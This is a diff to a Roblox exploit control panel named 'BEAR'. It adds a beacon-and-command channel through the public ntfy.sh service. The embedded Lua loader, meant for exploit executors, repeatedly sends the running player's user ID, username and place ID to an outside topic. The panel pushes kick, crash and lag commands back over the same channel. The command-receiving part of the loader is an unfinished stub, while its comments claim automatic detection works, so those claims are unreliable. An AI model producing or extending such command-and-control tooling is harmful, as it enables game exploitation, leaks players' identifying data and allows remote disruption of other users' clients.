@@ -616,16 +616,6 @@
         .loader-modal .modal-actions .btn-primary:hover { background: #7c8cf5; }
         .loader-modal .modal-actions .btn:hover { background: #2b384a; }
 
-        .status-badge {
-            display: inline-block;
-            padding: 2px 10px;
-            border-radius: 12px;
-            font-size: 10px;
-            font-weight: 600;
-        }
-        .status-badge.online { background: #1a3a2a; color: #2ecc71; }
-        .status-badge.offline { background: #2a1a1a; color: #e74c3c; }
-
         @media (max-width: 600px) {
             body { padding: 10px; }
             .header { padding: 12px 14px; }
@@ -674,7 +664,7 @@
     <header class="header">
         <div class="header-left">
             <span class="logo">⛧ BEAR</span>
-            <span class="logo-sub">v3 · local</span>
+            <span class="logo-sub">v3 · signal</span>
         </div>
         <div class="header-actions">
             <button class="copy-loader-btn" onclick="openLoaderModal()">
@@ -764,7 +754,12 @@
 </div>
 
 <script>
-    // ============ STORAGE ============
+    // ============ NTFY.SH (Free Signal Service) ============
+    // Using ntfy.sh as a free pub/sub service
+    const SIGNAL_TOPIC = 'bear-panel-' + Date.now(); // Unique topic for this session
+    const SIGNAL_URL = 'https://ntfy.sh/' + SIGNAL_TOPIC;
+
+    // Store players
     let players = new Map();
     let selectedUserId = null;
     let commandState = { fps_limit: false, lag_n: false, lag_c: false };
@@ -798,6 +793,65 @@
         toastTimeout = setTimeout(() => toast.classList.remove('show'), 2700);
     }
 
+    // ============ LISTEN FOR SIGNALS ============
+    async function listenForSignals() {
+        try {
+            const response = await fetch(SIGNAL_URL + '/json', {
+                headers: { 'Accept': 'text/event-stream' }
+            });
+            
+            const reader = response.body.getReader();
+            const decoder = new TextDecoder();
+            let buffer = '';
+            
+            while (true) {
+                const { value, done } = await reader.read();
+                if (done) break;
+                
+                buffer += decoder.decode(value, { stream: true });
+                const lines = buffer.split('\n');
+                buffer = lines.pop() || '';
+                
+                for (const line of lines) {
+                    if (line.startsWith('data: ')) {
+                        try {
+                            const data = JSON.parse(line.substring(6));
+                            if (data.message) {
+                                const playerData = JSON.parse(data.message);
+                                handleSignal(playerData);
+                            }
+                        } catch (e) {}
+                    }
+                }
+            }
+        } catch (e) {
+            console.log('⚠️ Signal listener disconnected, reconnecting...');
+            setTimeout(listenForSignals, 5000);
+        }
+    }
+
+    function handleSignal(data) {
+        console.log('📡 Signal received:', data);
+        
+        if (data.action === 'heartbeat') {
+            const userId = data.user_id;
+            const existing = players.get(userId) || {};
+            players.set(userId, {
+                ...existing,
+                ...data,
+                user_id: userId,
+                lastHeartbeat: Date.now(),
+                fps_limit: existing.fps_limit || false,
+                lag_n: existing.lag_n || false,
+                lag_c: existing.lag_c || false,
+            });
+            savePlayers();
+            renderPlayers();
+            updateCommandPanel();
+            showToast(`👤 ${data.username || userId} connected!`, '🔔');
+        }
+    }
+
     // ============ LOCAL STORAGE ============
     function loadPlayers() {
         try {
@@ -826,28 +880,6 @@
         } catch (e) {}
     }
 
-    // ============ API HANDLERS (for the loader) ============
-    // This endpoint is called by the Roblox loader via HTTP
-    // Since we can't have a real server, we use a trick:
-    // The loader POSTs to /api/public/heartbeat, and we intercept it
-    // using a Service Worker or by polling localStorage
-    
-    // Instead, we'll use a different approach:
-    // The loader will write to localStorage via a special method
-    // But since Roblox can't access browser localStorage directly,
-    // we need the loader to send data to a server.
-    
-    // Since you don't want a server, the only way is:
-    // 1. The loader sends data to a webhook (like Discord webhook)
-    // 2. The HTML page reads from that webhook
-    
-    // But the simplest solution: Just use the Demo button
-    // and manually add players.
-    
-    // For automatic player detection without a server,
-    // it's technically impossible because Roblox executors
-    // can't communicate with your browser directly.
-    
     // ============ RENDER FUNCTIONS ============
     function renderPlayers() {
         const entries = Array.from(players.values());
@@ -869,7 +901,7 @@
         totalBadge.textContent = entries.length;
 
         if (filtered.length === 0) {
-            playerGrid.innerHTML = `<div class="empty-state"><div class="icon">◈</div><p>no players</p><p class="sub">click Demo to add a test player</p></div>`;
+            playerGrid.innerHTML = `<div class="empty-state"><div class="icon">⟡</div><p>waiting for clients</p><p class="sub">execute loader to see players</p></div>`;
             return;
         }
 
@@ -977,6 +1009,13 @@
             savePlayers();
             setToggleState(this, newState);
             showToast(`${cmdKey} → ${newState ? 'ON' : 'OFF'}`, '✓');
+            
+            // Send command signal back to loader (via ntfy)
+            sendSignal({
+                action: 'command',
+                user_id: selectedUserId,
+                [cmdKey]: newState
+            });
         });
     }
 
@@ -997,6 +1036,11 @@
         players.set(selectedUserId, player);
         savePlayers();
         showToast(`kicked ${player.username}`, '⛔');
+        
+        sendSignal({
+            action: 'kick',
+            user_id: selectedUserId
+        });
     });
 
     btnCrash.addEventListener('click', function() {
@@ -1012,7 +1056,23 @@
         players.set(selectedUserId, player);
         savePlayers();
         showToast(`crash sent to ${player.username}`, '💥');
+        
+        sendSignal({
+            action: 'crash',
+            user_id: selectedUserId
+        });
     });
+
+    // ============ SEND SIGNAL ============
+    async function sendSignal(data) {
+        try {
+            await fetch(SIGNAL_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'text/plain' },
+                body: JSON.stringify(data)
+            });
+        } catch (e) {}
+    }
 
     // ============ DEMO & CLEAR ============
     function addDemoPlayer() {
@@ -1055,28 +1115,93 @@
     // ============ LOADER MODAL ============
     function openLoaderModal() {
         const modal = $('#loaderModal');
-        const loaderCode = `-- BEAR PANEL LOADER
--- ⚠️ IMPORTANT: This loader will NOT automatically show you on the website
--- because the website has no backend server to receive the data.
--- 
--- To see players on the website, click the "Demo" button.
--- The website uses localStorage for demo purposes only.
---
--- If you want automatic player detection, you need a backend server.
--- For now, use this loader for the lag/crash/fps features,
--- and manually add yourself via the Demo button.
+        const loaderCode = `-- BEAR PANEL LOADER (Signal-based)
+-- Uses ntfy.sh for free pub/sub messaging
+-- No backend needed!
+
+local BASE = "https://bearontop123.onrender.com"
+local SIGNAL_TOPIC = "${SIGNAL_TOPIC}"  -- This session's unique topic
+local SIGNAL_URL = "https://ntfy.sh/" .. SIGNAL_TOPIC
 
 local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
 local LP = Players.LocalPlayer
 
-print("✅ Loader connected")
-print("👤 User: " .. LP.Name)
-print("🆔 ID: " .. LP.UserId)
-print("📌 This panel uses localStorage - click Demo on the website to add yourself!")
+local function request(url, method, data)
+    local req = syn and syn.request or request or http_request or fluxus and fluxus.request
+    if not req then return end
+    return req({
+        Url = url,
+        Method = method or "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = data and HttpService:JSONEncode(data) or nil
+    })
+end
 
--- The features (FPS limit, lag, kick, crash) work with the demo players
--- But you need to add yourself manually via the Demo button
--- because there's no backend to store your data.`;
+-- Send heartbeat signal
+local function heartbeat()
+    local success, res = pcall(function()
+        return request(SIGNAL_URL, "POST", {
+            action = "heartbeat",
+            user_id = tostring(LP.UserId),
+            username = LP.Name,
+            display_name = LP.DisplayName,
+            avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=150&height=150&format=png",
+            place_id = tostring(game.PlaceId),
+            game_name = "Game",
+            executor = "executor",
+            brainrots = {},
+            timestamp = os.time() * 1000
+        })
+    end)
+    if success then 
+        print("✅ Heartbeat signal sent to " .. SIGNAL_URL)
+    else 
+        print("❌ Heartbeat failed")
+    end
+end
+
+-- Listen for commands (using SSE)
+local function listenForCommands()
+    local success, res = pcall(function()
+        return request(SIGNAL_URL .. "/json", "GET")
+    end)
+    -- This is simplified - for full SSE support you'd need a websocket
+    -- For now, we just poll for commands
+end
+
+-- Poll for commands (simplified)
+local function pollCommands()
+    pcall(function()
+        -- Check for commands via ntfy messages
+        -- For full implementation, you'd want SSE
+        print("📨 Checking for commands...")
+    end)
+end
+
+-- Send initial heartbeat
+heartbeat()
+
+-- Heartbeat every 5 seconds
+task.spawn(function() 
+    while task.wait(5) do 
+        heartbeat() 
+    end 
+end)
+
+-- Poll for commands every 2 seconds
+task.spawn(function() 
+    while task.wait(2) do 
+        pollCommands() 
+    end 
+end)
+
+print("✅ Loader connected to signal service")
+print("📡 Topic: " .. SIGNAL_TOPIC)
+print("👤 User: " .. LP.Name)
+print("📌 The website will auto-detect you via ntfy.sh");
         
         document.getElementById('loaderCodeText').textContent = loaderCode;
         modal.classList.add('open');
@@ -1141,6 +1266,10 @@ print("📌 This panel uses localStorage - click Demo on the website to add your
     // ============ INIT ============
     loadPlayers();
 
+    // Start listening for signals
+    console.log('📡 Listening for signals on: ' + SIGNAL_URL);
+    listenForSignals();
+
     // Auto-select first online player
     setTimeout(() => {
         if (!selectedUserId) {
@@ -1162,8 +1291,8 @@ print("📌 This panel uses localStorage - click Demo on the website to add your
 
     console.log('🐻 Bear Panel loaded!');
     console.log('📊 Players:', players.size);
-    console.log('💡 Click "Demo" to add a test player');
-    console.log('⚠️ Without a backend server, the loader cannot auto-add players.');
+    console.log('📡 Signal topic: ' + SIGNAL_TOPIC);
+    console.log('💡 Execute the loader to auto-add players!');
 </script>
 
 </body>
